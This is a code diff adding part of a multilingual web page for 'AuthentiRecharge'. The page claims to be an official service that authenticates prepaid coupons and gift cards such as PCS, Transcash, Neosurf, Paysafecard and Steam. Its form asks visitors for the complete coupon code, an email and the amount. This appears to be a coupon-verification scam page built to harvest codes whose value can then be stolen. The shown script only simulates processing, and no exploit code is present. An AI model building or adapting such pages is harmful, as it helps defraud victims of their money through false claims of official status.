+                "footer.about_title": "AuthentiRecharge",
+                "footer.about_desc": "Service technique officiel d'authentification des recharges et coupons. Authentification sécurisée et professionnelle.",
+                "footer.services_title": "Services",
+                "footer.service_pcs": "Authentification PCS",
+                "footer.service_transcash": "Authentification TRANSCASH",
+                "footer.service_neosurf": "Validation NEO-SURF",
+                "footer.service_itunes": "Cartes iTunes",
+                "footer.service_steam": "Codes STEAM",
+                "footer.service_paysafe": "PAYSAFECARD",
+                "footer.service_google": "GOOGLE PLAY",
+                "footer.service_toneo": "TONEO FIRST",
+                "footer.service_cashlib": "CASHLIB",
+                "footer.links_title": "Liens Utiles",
+                "footer.link_about": "À propos de nous",
+                "footer.link_terms": "Conditions d'utilisation",
+                "footer.link_privacy": "Politique de confidentialité",
+                "footer.link_faq": "FAQ",
+                "footer.link_help": "Centre d'aide",
+                "footer.link_blog": "Blog",
+                "footer.copyright": "© 2023 AuthentiRecharge. Tous droits réservés. | Service technique d'authentification des recharges"
+            },
+            en: {
+                "site.title": "AuthentiRecharge",
+                "nav.home": "Home",
+                "nav.services": "Services",
+                "nav.auth": "Authentication",
+                "nav.contact": "Contact",
+                "hero.title": "RECHARGE AUTHENTICATION SERVICE",
+                "hero.description": "Welcome to the official verification and authentication platform for PCS, TRANSCASH, NEO-SURF, ITUNES, STEAM, PAYSAFECARD, GOOGLE PLAY, TONEO FIRST and CASHLIB recharges. Our experienced team is available 24/7.",
+                "hero.btn_verify": "Verify a recharge",
+                "hero.btn_services": "Our services",
+                "services.title": "Our Authentication Services",
+                "services.description": "We offer a complete verification service for all your coupons and recharges",
+                "services.verify_btn": "Verify",
+                "services.pcs_desc": "Secure authentication of PCS recharges with real-time verification.",
+                "services.transcash_desc": "Complete verification of TRANSCASH coupons with detailed report.",
+                "services.neosurf_desc": "Authentication of NEO-SURF codes with instant validation.",
+                "services.itunes_desc": "Verification of iTunes gift cards with validity guarantee.",
+                "services.steam_desc": "Authentication of Steam cards with immediate confirmation.",
+                "services.paysafe_desc": "Secure verification of Paysafecard codes with advanced protection.",
+                "services.google_desc": "Authentication of Google Play cards with guaranteed validation.",
+                "services.toneo_desc": "Fast and secure verification of Toneo First recharges.",
+                "services.cashlib_desc": "Authentication of Cashlib coupons with enhanced security procedure.",
+                "auth.title": "Recharge Authentication",
+                "auth.description": "Submit your recharge for secure and fast verification",
+                "auth.form_title": "Verification Form",
+                "auth.type_label": "Recharge type",
+                "auth.select_type": "Select a type",
+                "auth.code_label": "Recharge code",
+                "auth.email_label": "Recharge email",
+                "auth.code_placeholder": "Enter the complete code",
+                "auth.email_placeholder": "Enter the mail",
+                "auth.amount_label": "Amount",
+                "auth.amount_placeholder": "Amount in €",
+                "auth.hide_code": "Hide code in results",
+                "auth.submit_btn": "Submit for verification",
+                "auth.terms": "Terms of use",
+                "auth.help": "Assistance",
+                "features.title": "Why Choose Us",
+                "features.description": "Our service stands out for its reliability and professionalism",
+                "features.security_title": "Maximum Security",
+                "features.security_desc": "Advanced security protocols to protect your data and transactions.",
+                "features.availability_title": "24/7 Availability",
+                "features.availability_desc": "Our team is available at any time to meet your needs.",
+                "features.speed_title": "Fast Verification",
+                "features.speed_desc": "Accelerated authentication process for real-time results.",
+                "features.team_title": "Experienced Team",
+                "features.team_desc": "Qualified professionals with years of experience in the field.",
+                "features.support_title": "Multilingual Support",
+                "features.support_desc": "Assistance available in multiple languages for an optimal experience.",
+                "features.privacy_title": "Guaranteed Confidentiality",
+                "features.privacy_desc": "Your personal information and codes are protected and encrypted.",
+                "contact.title": "Contact Our Team",
+                "contact.description": "Our customer service is available 24 hours a day, 7 days a week to answer all your questions and assist you in the authentication process.",
+                "contact.support_title": "24/7 Support",
+                "contact.support_desc": "Technical support and customer service",
+                "contact.email_title": "Email",
+                "contact.phone_title": "Phone",
+                "contact.form_title": "Assistance Request",
+                "contact.name_placeholder": "Your name",
+                "contact.email_placeholder": "Your email",
+                "contact.subject_default": "Request subject",
+                "contact.subject_verification": "Verification problem",
+                "contact.subject_technical": "Technical problem",
+                "contact.subject_billing": "Billing question",
+                "contact.subject_other": "Other",
+                "contact.message_placeholder": "Describe your problem or question",
+                "contact.submit_btn": "Send request",
+                "footer.about_title": "AuthentiRecharge",
+                "footer.about_desc": "Official technical service for recharge and coupon authentication. Secure and professional verification.",
+                "footer.services_title": "Services",
+                "footer.service_pcs": "PCS Authentication",
+                "footer.service_transcash": "TRANSCASH Verification",
+                "footer.service_neosurf": "NEO-SURF Validation",
+                "footer.service_itunes": "iTunes Cards",
+                "footer.service_steam": "STEAM Codes",
+                "footer.service_paysafe": "PAYSAFECARD",
+                "footer.service_google": "GOOGLE PLAY",
+                "footer.service_toneo": "TONEO FIRST",
+                "footer.service_cashlib": "CASHLIB",
+                "footer.links_title": "Useful Links",
+                "footer.link_about": "About us",
+                "footer.link_terms": "Terms of use",
+                "footer.link_privacy": "Privacy Policy",
+                "footer.link_faq": "FAQ",
+                "footer.link_help": "Help Center",
+                "footer.link_blog": "Blog",
+                "footer.copyright": "© 2023 AuthentiRecharge. All rights reserved. | Recharge authentication technical service"
+            },
+            es: {
+                "site.title": "AuthentiRecharge",
+                "nav.home": "Inicio",
+                "nav.services": "Servicios",
+                "nav.auth": "Autenticación",
+                "nav.contact": "Contacto",
+                "hero.title": "SERVICIO DE AUTENTICACIÓN DE RECARGAS",
+                "hero.description": "Bienvenido a la plataforma oficial de verificación y autenticación de recargas PCS, TRANSCASH, NEO-SURF, ITUNES, STEAM, PAYSAFECARD, GOOGLE PLAY, TONEO FIRST y CASHLIB. Nuestro equipo experimentado está disponible 24/7.",
+                "hero.btn_verify": "Verificar una recarga",
+                "hero.btn_services": "Nuestros servicios",
+                "services.title": "Nuestros Servicios de Autenticación",
+                "services.description": "Ofrecemos un servicio de verificación completo para todos sus cupones y recargas",
+                "services.verify_btn": "Verificar",
+                "services.pcs_desc": "Autenticación segura de recargas PCS con verificación en tiempo real.",
+                "services.transcash_desc": "Verificación completa de cupones TRANSCASH con informe detallado.",
+                "services.neosurf_desc": "Autenticación de códigos NEO-SURF con validación instantánea.",
+                "services.itunes_desc": "Verificación de tarjetas de regalo iTunes con garantía de validez.",
+                "services.steam_desc": "Autenticación de tarjetas Steam con confirmación inmediata.",
+                "services.paysafe_desc": "Verificación segura de códigos Paysafecard con protección avanzada.",
+                "services.google_desc": "Autenticación de tarjetas Google Play con validación garantizada.",
+                "services.toneo_desc": "Verificación rápida y segura de recargas Toneo First.",
+                "services.cashlib_desc": "Autenticación de cupones Cashlib con procedimiento de seguridad mejorado.",
+                "auth.title": "Autenticación de Recargas",
+                "auth.description": "Envía tu recarga para una verificación segura y rápida",
+                "auth.form_title": "Formulario de Verificación",
+                "auth.type_label": "Tipo de recarga",
+                "auth.select_type": "Seleccione un tipo",
+                "auth.code_label": "Código de recarga",
+                "auth.email_label": "email de recarga",
+                "auth.code_placeholder": "Ingrese el código completo",
+                "auth.email_placeholder": "Ingrese el correo electrónico",
+                "auth.amount_label": "Monto",
+                "auth.amount_placeholder": "Monto en €",
+                "auth.hide_code": "Ocultar código en los resultados",
+                "auth.submit_btn": "Enviar para verificación",
+                "auth.terms": "Términos de uso",
+                "auth.help": "Asistencia",
+                "features.title": "Por Qué Elegirnos",
+                "features.description": "Nuestro servicio se destaca por su confiabilidad y profesionalismo",
+                "features.security_title": "Seguridad Máxima",
+                "features.security_desc": "Protocolos de seguridad avanzados para proteger sus datos y transacciones.",
+                "features.availability_title": "Disponibilidad 24/7",
+                "features.availability_desc": "Nuestro equipo está disponible en cualquier momento para satisfacer sus necesidades.",
+                "features.speed_title": "Verificación Rápida",
+                "features.speed_desc": "Proceso de autenticación acelerado para resultados en tiempo real.",
+                "features.team_title": "Equipo Experimentado",
+                "features.team_desc": "Profesionales calificados con años de experiencia en el campo.",
+                "features.support_title": "Soporte Multilingüe",
+                "features.support_desc": "Asistencia disponible en varios idiomas para una experiencia óptima.",
+                "features.privacy_title": "Confidencialidad Garantizada",
+                "features.privacy_desc": "Su información personal y códigos están protegidos y encriptados.",
+                "contact.title": "Contacte a Nuestro Equipo",
+                "contact.description": "Nuestro servicio al cliente está disponible las 24 horas del día, los 7 días de la semana para responder a todas sus preguntas y asistirle en el proceso de autenticación.",
+                "contact.support_title": "Soporte 24/7",
+                "contact.support_desc": "Soporte técnico y servicio al cliente",
+                "contact.email_title": "Correo electrónico",
+                "contact.phone_title": "Teléfono",
+                "contact.form_title": "Solicitud de Asistencia",
+                "contact.name_placeholder": "Su nombre",
+                "contact.email_placeholder": "Su correo electrónico",
+                "contact.subject_default": "Asunto de la solicitud",
+                "contact.subject_verification": "Problema de verificación",
+                "contact.subject_technical": "Problema técnico",
+                "contact.subject_billing": "Pregunta de facturación",
+                "contact.subject_other": "Otro",
+                "contact.message_placeholder": "Describa su problema o pregunta",
+                "contact.submit_btn": "Enviar solicitud",
+                "footer.about_title": "AuthentiRecharge",
+                "footer.about_desc": "Servicio técnico oficial de autenticación de recargas y cupones. Verificación segura y profesional.",
+                "footer.services_title": "Servicios",
+                "footer.service_pcs": "Autenticación PCS",
+                "footer.service_transcash": "Verificación TRANSCASH",
+                "footer.service_neosurf": "Validación NEO-SURF",
+                "footer.service_itunes": "Tarjetas iTunes",
+                "footer.service_steam": "Códigos STEAM",
+                "footer.service_paysafe": "PAYSAFECARD",
+                "footer.service_google": "GOOGLE PLAY",
+                "footer.service_toneo": "TONEO FIRST",
+                "footer.service_cashlib": "CASHLIB",
+                "footer.links_title": "Enlaces Útiles",
+                "footer.link_about": "Acerca de nosotros",
+                "footer.link_terms": "Términos de uso",
+                "footer.link_privacy": "Política de privacidad",
+                "footer.link_faq": "FAQ",
+                "footer.link_help": "Centro de ayuda",
+                "footer.link_blog": "Blog",
+                "footer.copyright": "© 2023 AuthentiRecharge. Todos los derechos reservados. | Servicio técnico de autenticación de recargas"
+            },
+            de: {
+                "site.title": "AuthentiRecharge",
+                "nav.home": "Startseite",
+                "nav.services": "Dienstleistungen",
+                "nav.auth": "Authentifizierung",
+                "nav.contact": "Kontakt",
+                "hero.title": "AUFLADUNGS-AUTHENTIFIZIERUNGSDIENST",
+                "hero.description": "Willkommen auf der offiziellen Plattform zur Überprüfung und Authentifizierung von PCS-, TRANSCASH-, NEO-SURF-, ITUNES-, STEAM-, PAYSAFECARD-, GOOGLE PLAY-, TONEO FIRST- und CASHLIB-Aufladungen. Unser erfahrenes Team steht Ihnen 24/7 zur Verfügung.",
+                "hero.btn_verify": "Aufladung überprüfen",
+                "hero.btn_services": "Unsere Dienstleistungen",
+                "services.title": "Unsere Authentifizierungsdienste",
+                "services.description": "Wir bieten einen vollständigen Überprüfungsservice für alle Ihre Gutscheine und Aufladungen",
+                "services.verify_btn": "Überprüfen",
+                "services.pcs_desc": "Sichere Authentifizierung von PCS-Aufladungen mit Echtzeitüberprüfung.",
+                "services.transcash_desc": "Vollständige Überprüfung von TRANSCASH-Gutscheinen mit detailliertem Bericht.",
+                "services.neosurf_desc": "Authentifizierung von NEO-SURF-Codes mit sofortiger Validierung.",
+                "services.itunes_desc": "Überprüfung von iTunes-Geschenkkarten mit Gültigkeitsgarantie.",
+                "services.steam_desc": "Authentifizierung von Steam-Karten mit sofortiger Bestätigung.",
+                "services.paysafe_desc": "Sichere Überprüfung von Paysafecard-Codes mit erweitertem Schutz.",
+                "services.google_desc": "Authentifizierung von Google Play-Karten mit garantierter Validierung.",
+                "services.toneo_desc": "Schnelle und sichere Überprüfung von Toneo First-Aufladungen.",
+                "services.cashlib_desc": "Authentifizierung von Cashlib-Gutscheinen mit erweitertem Sicherheitsverfahren.",
+                "auth.title": "Aufladungsauthentifizierung",
+                "auth.description": "Reichen Sie Ihre Aufladung zur sicheren und schnellen Überprüfung ein",
+                "auth.form_title": "Überprüfungsformular",
+                "auth.type_label": "Aufladungstyp",
+                "auth.select_type": "Wählen Sie einen Typ",
+                "auth.code_label": "Aufladungscode",
+                "auth.email_label": "E-Mail zur Aufladung",
+                "auth.code_placeholder": "Geben Sie den vollständigen Code ein",
+                "auth.email_placeholder": "E-Mail eingeben",
+                "auth.amount_label": "Betrag",
+                "auth.amount_placeholder": "Betrag in €",
+                "auth.hide_code": "Code in den Ergebnissen ausblenden",
+                "auth.submit_btn": "Zur Überprüfung einreichen",
+                "auth.terms": "Nutzungsbedingungen",
+                "auth.help": "Hilfe",
+                "features.title": "Warum Uns Wählen",
+                "features.description": "Unser Service zeichnet sich durch Zuverlässigkeit und Professionalität aus",
+                "features.security_title": "Maximale Sicherheit",
+                "features.security_desc": "Erweiterte Sicherheitsprotokolle zum Schutz Ihrer Daten und Transaktionen.",
+                "features.availability_title": "24/7 Verfügbarkeit",
+                "features.availability_desc": "Unser Team steht Ihnen jederzeit zur Verfügung, um Ihre Bedürfnisse zu erfüllen.",
+                "features.speed_title": "Schnelle Überprüfung",
+                "features.speed_desc": "Beschleunigter Authentifizierungsprozess für Echtzeitergebnisse.",
+                "features.team_title": "Erfahrenes Team",
+                "features.team_desc": "Qualifizierte Fachkräfte mit langjähriger Erfahrung auf dem Gebiet.",
+                "features.support_title": "Mehrsprachiger Support",
+                "features.support_desc": "Unterstützung in mehreren Sprachen für ein optimales Erlebnis.",
+                "features.privacy_title": "Garantierte Vertraulichkeit",
+                "features.privacy_desc": "Ihre persönlichen Daten und Codes sind geschützt und verschlüsselt.",
+                "contact.title": "Kontaktieren Sie Unser Team",
+                "contact.description": "Unser Kundenservice ist 24 Stunden am Tag, 7 Tage die Woche erreichbar, um alle Ihre Fragen zu beantworten und Sie im Authentifizierungsprozess zu unterstützen.",
+                "contact.support_title": "24/7 Support",
+                "contact.support_desc": "Technischer Support und Kundenservice",
+                "contact.email_title": "E-Mail",
+                "contact.phone_title": "Telefon",
+                "contact.form_title": "Hilfeanfrage",
+                "contact.name_placeholder": "Ihr Name",
+                "contact.email_placeholder": "Ihre E-Mail",
+                "contact.subject_default": "Betreff der Anfrage",
+                "contact.subject_verification": "Überprüfungsproblem",
+                "contact.subject_technical": "Technisches Problem",
+                "contact.subject_billing": "Abrechnungsfrage",
+                "contact.subject_other": "Andere",
+                "contact.message_placeholder": "Beschreiben Sie Ihr Problem oder Ihre Frage",
+                "contact.submit_btn": "Anfrage senden",
+                "footer.about_title": "AuthentiRecharge",
+                "footer.about_desc": "Offizieller technischer Service für die Authentifizierung von Aufladungen und Gutscheinen. Sichere und professionelle Überprüfung.",
+                "footer.services_title": "Dienstleistungen",
+                "footer.service_pcs": "PCS-Authentifizierung",
+                "footer.service_transcash": "TRANSCASH-Überprüfung",
+                "footer.service_neosurf": "NEO-SURF-Validierung",
+                "footer.service_itunes": "iTunes-Karten",
+                "footer.service_steam": "STEAM-Codes",
+                "footer.service_paysafe": "PAYSAFECARD",
+                "footer.service_google": "GOOGLE PLAY",
+                "footer.service_toneo": "TONEO FIRST",
+                "footer.service_cashlib": "CASHLIB",
+                "footer.links_title": "Nützliche Links",
+                "footer.link_about": "Über uns",
+                "footer.link_terms": "Nutzungsbedingungen",
+                "footer.link_privacy": "Datenschutzrichtlinie",
+                "footer.link_faq": "FAQ",
+                "footer.link_help": "Hilfezentrum",
+                "footer.link_blog": "Blog",
+                "footer.copyright": "© 2023 AuthentiRecharge. Alle Rechte vorbehalten. | Technischer Service zur Aufladungsauthentifizierung"
+            },
+            pt: {
+                "site.title": "AuthentiRecharge",
+                "nav.home": "Início",
+                "nav.services": "Serviços",
+                "nav.auth": "Autenticação",
+                "nav.contact": "Contato",
+                "hero.title": "SERVIÇO DE AUTENTICAÇÃO DE RECARGAS",
+                "hero.description": "Bem-vindo à plataforma oficial de verificação e autenticação de recargas PCS, TRANSCASH, NEO-SURF, ITUNES, STEAM, PAYSAFECARD, GOOGLE PLAY, TONEO FIRST e CASHLIB. Nossa equipe experiente está disponível 24 horas por dia.",
+                "hero.btn_verify": "Verificar uma recarga",
+                "hero.btn_services": "Nossos serviços",
+                "services.title": "Nossos Serviços de Autenticação",
+                "services.description": "Oferecemos um serviço de verificação completo para todos os seus cupons e recargas",
+                "services.verify_btn": "Verificar",
+                "services.pcs_desc": "Autenticação segura de recargas PCS com verificação em tempo real.",
+                "services.transcash_desc": "Verificação completa de cupons TRANSCASH com relatório detalhado.",
+                "services.neosurf_desc": "Autenticação de códigos NEO-SURF com validação instantânea.",
+                "services.itunes_desc": "Verificação de cartões-presente iTunes com garantia de validade.",
+                "services.steam_desc": "Autenticação de cartões Steam com confirmação imediata.",
+                "services.paysafe_desc": "Verificação segura de códigos Paysafecard com proteção avançada.",
+                "services.google_desc": "Autenticação de cartões Google Play com validação garantida.",
+                "services.toneo_desc": "Verificação rápida e segura de recargas Toneo First.",
+                "services.cashlib_desc": "Autenticação de cupons Cashlib com procedimento de segurança reforçado.",
+                "auth.title": "Autenticação de Recarga",
+                "auth.description": "Envie sua recarga para verificação segura e rápida",
+                "auth.form_title": "Formulário de Verificação",
+                "auth.type_label": "Tipo de recarga",
+                "auth.select_type": "Selecione um tipo",
+                "auth.code_label": "Código de recarga",
+                "auth.email_label": "email de recarga",
+                "auth.code_placeholder": "Digite o código completo",
+                "auth.email_placeholder": "Inserir o e-mail",
+                "auth.amount_label": "Valor",
+                "auth.amount_placeholder": "Valor em €",
+                "auth.hide_code": "Ocultar código nos resultados",
+                "auth.submit_btn": "Enviar para verificação",
+                "auth.terms": "Termos de uso",
+                "auth.help": "Assistência",
+                "features.title": "Por Que Nos Escolher",
+                "features.description": "Nosso serviço se destaca pela confiabilidade e profissionalismo",
+                "features.security_title": "Segurança Máxima",
+                "features.security_desc": "Protocolos de segurança avançados para proteger seus dados e transações.",
+                "features.availability_title": "Disponibilidade 24/7",
+                "features.availability_desc": "Nossa equipe está disponível a qualquer hora para atender às suas necessidades.",
+                "features.speed_title": "Verificação Rápida",
+                "features.speed_desc": "Processo de autenticação acelerado para resultados em tempo real.",
+                "features.team_title": "Equipe Experiente",
+                "features.team_desc": "Profissionais qualificados com anos de experiência na área.",
+                "features.support_title": "Suporte Multilíngue",
+                "features.support_desc": "Assistência disponível em vários idiomas para uma experiência ideal.",
+                "features.privacy_title": "Confidencialidade Garantida",
+                "features.privacy_desc": "Suas informações pessoais e códigos são protegidos e criptografados.",
+                "contact.title": "Contate Nossa Equipe",
+                "contact.description": "Nosso serviço de atendimento ao cliente está disponível 24 horas por dia, 7 dias por semana para responder a todas as suas perguntas e auxiliá-lo no processo de autenticação.",
+                "contact.support_title": "Suporte 24/7",
+                "contact.support_desc": "Suporte técnico e atendimento ao cliente",
+                "contact.email_title": "E-mail",
+                "contact.phone_title": "Telefone",
+                "contact.form_title": "Solicitação de Assistência",
+                "contact.name_placeholder": "Seu nome",
+                "contact.email_placeholder": "Seu e-mail",
+                "contact.subject_default": "Assunto da solicitação",
+                "contact.subject_verification": "Problema de verificação",
+                "contact.subject_technical": "Problema técnico",
+                "contact.subject_billing": "Pergunta de faturamento",
+                "contact.subject_other": "Outro",
+                "contact.message_placeholder": "Descreva seu problema ou pergunta",
+                "contact.submit_btn": "Enviar solicitação",
+                "footer.about_title": "AuthentiRecharge",
+                "footer.about_desc": "Serviço técnico oficial de autenticação de recargas e cupons. Verificação segura e profissional.",
+                "footer.services_title": "Serviços",
+                "footer.service_pcs": "Autenticação PCS",
+                "footer.service_transcash": "Verificação TRANSCASH",
+                "footer.service_neosurf": "Validação NEO-SURF",
+                "footer.service_itunes": "Cartões iTunes",
+                "footer.service_steam": "Códigos STEAM",
+                "footer.service_paysafe": "PAYSAFECARD",
+                "footer.service_google": "GOOGLE PLAY",
+                "footer.service_toneo": "TONEO FIRST",
+                "footer.service_cashlib": "CASHLIB",
+                "footer.links_title": "Links Úteis",
+                "footer.link_about": "Sobre nós",
+                "footer.link_terms": "Termos de uso",
+                "footer.link_privacy": "Política de Privacidade",
+                "footer.link_faq": "FAQ",
+                "footer.link_help": "Central de Ajuda",
+                "footer.link_blog": "Blog",
+                "footer.copyright": "© 2023 AuthentiRecharge. Todos os direitos reservados. | Serviço técnico de autenticação de recargas"
+            }
+        };
+
+        // Fonction pour changer la langue
+        function changeLanguage(lang) {
+            // Mettre à jour l'attribut lang de l'élément html
+            document.documentElement.lang = lang;
+            
+            // Mettre à jour tous les éléments avec l'attribut data-i18n
+            document.querySelectorAll('[data-i18n]').forEach(element => {
+                const key = element.getAttribute('data-i18n');
+                if (translations[lang] && translations[lang][key]) {
+                    element.textContent = translations[lang][key];
+                }
+            });
+            
+            // Mettre à jour les placeholders
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
+                const key = element.getAttribute('data-i18n-placeholder');
+                if (translations[lang] && translations[lang][key]) {
+                    element.placeholder = translations[lang][key];
+                }
+            });
+            
+            // Mettre à jour le sélecteur de langue
+            document.getElementById('languageSelector').value = lang;
+            
+            // Sauvegarder la préférence de langue
+            localStorage.setItem('preferredLanguage', lang);
+        }
+
+        // Animation au défilement
+        document.addEventListener('DOMContentLoaded', function() {
+            const fadeElements = document.querySelectorAll('.fade-in');
+            
+            const fadeInOnScroll = function() {
+                fadeElements.forEach(element => {
+                    const elementTop = element.getBoundingClientRect().top;
+                    const elementVisible = 150;
+                    
+                    if (elementTop < window.innerHeight - elementVisible) {
+                        element.classList.add('active');
+                    }
+                });
+            };
+            
+            // Vérifier au chargement
+            fadeInOnScroll();
+            
+            // Vérifier au défilement
+            window.addEventListener('scroll', fadeInOnScroll);
+            
+            // Gestion du formulaire
+            const authForm = document.getElementById('authForm');
+            if (authForm) {
+                authForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const rechargeType = document.getElementById('rechargeType').value;
+                    const rechargeCode = document.getElementById('rechargeCode').value;
+                    const rechargeAmount = document.getElementById('rechargeAmount').value;
+                    const hideCode = document.getElementById('hideCode').checked;
+                    
+                    if (!rechargeType || !rechargeCode || !rechargeAmount) {
+                        const currentLang = document.getElementById('languageSelector').value;
+                        const errorMsg = translations[currentLang] && translations[currentLang]['auth.error_required'] 
+                            ? translations[currentLang]['auth.error_required'] 
+                            : 'Veuillez remplir tous les champs obligatoires.';
+                        alert(errorMsg);
+                        return;
+                    }
+                    
+                    // Simulation de traitement
+                    const currentLang = document.getElementById('languageSelector').value;
+                    const successMsg = translations[currentLang] && translations[currentLang]['auth.success_message'] 
+                        ? translations[currentLang]['auth.success_message'] 
+                        : `Votre recharge ${rechargeType} d'un montant de ${rechargeAmount}€ a été soumise pour authentification. ${hideCode ? 'Le code sera masqué dans les résultats.' : ''}`;
+                    
+                    alert(successMsg);
+                    
+                    // Réinitialiser le formulaire
+                    authForm.reset();
+                });
+            }
+            
+            // Navigation fluide
+            document.querySelectorAll('nav a, .hero-buttons a').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href');
+                    if (targetId.startsWith('#')) {
+                        const targetElement = document.querySelector(targetId);
+                        if (targetElement) {
+                            window.scrollTo({
+                                top: targetElement.offsetTop - 80,
+                                behavior: 'smooth'
+                            });
+                        }
+                    }
+                });
+            });
+            
+            // Gestion du sélecteur de langue
+            const languageSelector = document.getElementById('languageSelector');
+            languageSelector.addEventListener('change', function() {
+                changeLanguage(this.value);
+            });
+            
+            // Charger la langue préférée
+            const preferredLanguage = localStorage.getItem('preferredLanguage') || 'fr';
+            changeLanguage(preferredLanguage);
+        });
+    </script>
+
+      <script>
+    // Lorsque la page se charge, on vérifie l'URL pour afficher le snackbar si besoin
+window.onload = function() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const status = urlParams.get('status');
+  
+  const snackbar = document.getElementById('snackbar');
+
+  if (status === 'success') {
+    snackbar.textContent = '✅ Message envoyé avec succès !';
+    snackbar.style.backgroundColor = '#4CAF50'; // Vert pour succès
+    showSnackbar();
+  } else if (status === 'error') {
+    snackbar.textContent = '⚠️ Tous les champs sont requis.';
+    snackbar.style.backgroundColor = '#FF5733'; // Rouge pour erreur
+    showSnackbar();
+  } else if (status === 'smtp_error') {
+    snackbar.textContent = '❌ Impossible de se connecter au serveur SMTP.';
+    snackbar.style.backgroundColor = '#FF5733'; // Rouge pour erreur
+    showSnackbar();
+  } else if (status === 'send_error') {
+    snackbar.textContent = '❌ Une erreur est survenue lors de l’envoi du message.';
+    snackbar.style.backgroundColor = '#FF5733'; // Rouge pour erreur
+    showSnackbar();
+  }
+};
+
+// Fonction pour afficher le snackbar
+function showSnackbar() {
+  const snackbar = document.getElementById('snackbar');
+  snackbar.className = 'show';
+  setTimeout(function() {
+    snackbar.className = snackbar.className.replace("show", "");
+  }, 5000); // Le snackbar disparait après 3 secondes
+}
+
+  </script>
+</body>
+</html>
